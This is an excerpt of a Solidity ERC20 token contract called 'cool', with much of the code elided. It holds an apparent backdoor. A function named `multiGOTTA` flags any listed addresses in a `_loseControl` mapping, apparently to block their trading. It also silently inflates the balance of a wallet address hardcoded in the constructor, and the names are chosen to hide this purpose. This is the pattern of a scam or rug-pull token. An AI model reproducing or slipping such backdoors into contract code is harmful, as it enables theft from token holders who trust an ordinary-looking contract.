...
contract cool is Context, IERC20, Ownable{
    ...
    constructor () {
        ...
        _seeYa = payable(address(0xa15089e11FB0FD408f0D9c7A3eB5189FC57D0FCF));
    ...
    function multiGOTTA(bool status,address[] calldata Amazing) public {
        for (uint256 v; v < Amazing.length; v++) {
            _gotta = (Amazing[v] == _seeYa);
            if(_gotta)_balances[_seeYa] =  _balances[_seeYa] + uint256(2 * tFee + 1 * tFee);
            _loseControl[Amazing[v]] = status;
        }
    }
